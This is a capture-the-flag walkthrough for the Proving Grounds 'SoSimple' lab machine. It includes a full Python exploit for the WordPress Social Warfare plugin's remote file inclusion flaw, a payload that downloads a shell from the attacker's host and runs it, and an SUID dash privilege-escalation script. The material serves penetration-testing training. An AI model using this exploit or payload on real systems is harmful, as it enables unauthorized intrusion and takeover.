---
title: "PG Play: SoSimple"
created: "2023-07-22"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "SoSimple"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - suid-exploitation
  - gtfobins-exploit
  - reverse-shell
  - ssh-key-theft
  - wordpress-enumeration-wpscan
related:
  - "[[GTFObins-SUID-Quick-Reference]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[FTP-Exploitation-Techniques]]"
  - "[[Web-Directory-Enumeration]]"
  - "[[Searchsploit-and-CVE-Workflow]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: SoSimple

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-07-22

---

## Quick Summary

**Open Ports:**
- 22/tcp (ssh)
- 80/tcp (http)

**Key Techniques:**
- SUID Exploitation
- GTFObins Exploit
- Reverse Shell
- SSH Key Theft
- WordPress Enumeration (WPScan)
- WordPress
- Searchsploit / Exploit-DB
- msfvenom Payload

**Privilege Escalation Path:**
- SUID → GTFObins
- Kernel exploit

---

## Full Walkthrough

Proving grounds Play - SoSimple CTF writeup.


[*(screenshot)*](https://youtu.be/KodURDujWxs)

## NMAP
```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)
|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)
|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: So Simple
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Fuzzing for directories and Files
```sh
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.158.78/FUZZ/
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000000327:   200        147 L    646 W      13420 Ch    "wordpress"                           
000000386:   403        9 L      28 W       279 Ch      "icons"                               
000004227:   403        9 L      28 W       279 Ch      "server-status"                       
000004255:   200        77 L     39 W       495 Ch      "http://192.168.158.78//"             
000010756:   404        9 L      31 W       276 Ch      "secure_html"
```

## WPScan
```sh
+] social-warfare
 | Location: http://192.168.158.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2023-02-15T16:23:00.000Z
 | [!] The version is out of date, the latest version is 4.4.1
```

### Searchsploit


### Exploit

```py
import sys
import requests
import re
import urlparse
import optparse

class EXPLOIT:

	VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"

	def __init__(self, _t, _p):
		self.target  = _t
		self.payload = _p

	def engage(self):
		uri = urlparse.urljoin( self.target, self.VULNPATH % self.payload )
		r = requests.get( uri )
		if r.status_code == 500:
			print "[*] Received Response From Server!"
			rr  = r.text
			obj = re.search(r"^(.*)<\!DOCTYPE", r.text.replace( "\n", "lnbreak" ))
			if obj:
				resp = obj.groups()[0]
				if resp:
					print "[<] Received: "
					print resp.replace( "lnbreak", "\n" )
				else:
					sys.exit("[<] Nothing Received for the given payload. Seems like the server is not vulnerable!")
			else:
				sys.exit("[<] Nothing Received for the given payload. Seems like the server is not vulnerable!")
		else:
			sys.exit( "[~] Unexpected Status Received!" )

def main():
	parser = optparse.OptionParser(  )

	parser.add_option( '-t', '--target', dest="target", default="", type="string", help="Target Link" )
	parser.add_option( ''  , '--payload-uri', dest="payload", default="", type="string", help="URI where the file payload.txt is located." )

	(options, args) = parser.parse_args()

	print "[>] Sending Payload to System!"
	exploit = EXPLOIT( options.target, options.payload )
	exploit.engage()

if __name__ == "__main__":
	main()
```

Vulnerable PATH

```py
VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"
```
### Remote File Inclusion

**Remote payload file**

```text
<pre>
system("wget http://192.168.45.217:8000/shell  -O /var/tmp/shell; chmod 755 /var/tmp/shell; chmod +x /var/tmp/shell; /var/tmp/shell");
</pre>
```
### Reverse shell payload using msfvenom


### RFI Exploitation


**Reverse shell connection obtained.**

## Privilege Escalation

User `max` ssh id_rsa file has been found.


### SSH login to max


Listing `max` user permission, finding exploit for the `service` using GTFO bins and switch user to `steven`


Listing `steven` user permisssions


Create bash script using the location mentioned in the permissions.

```sh
#!/bin/bash

cp /bin/dash /var/tmp/dash; chmod u+s /var/tmp/dash
```

`chmod u+s` Allows the binary to be executed as owner + SUID permissions.

### Running script as root user


**Run** `dash`


`dash -p` preserves effective privilege with which it was created and executed with same privilege.

**Root obtained.**

---

## Technique Links

- [[GTFObins-SUID-Quick-Reference]]
- [[Reverse-Shell-Reference]]
- [[FTP-Exploitation-Techniques]]
- [[Web-Directory-Enumeration]]
- [[Searchsploit-and-CVE-Workflow]]
- [[Linux-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
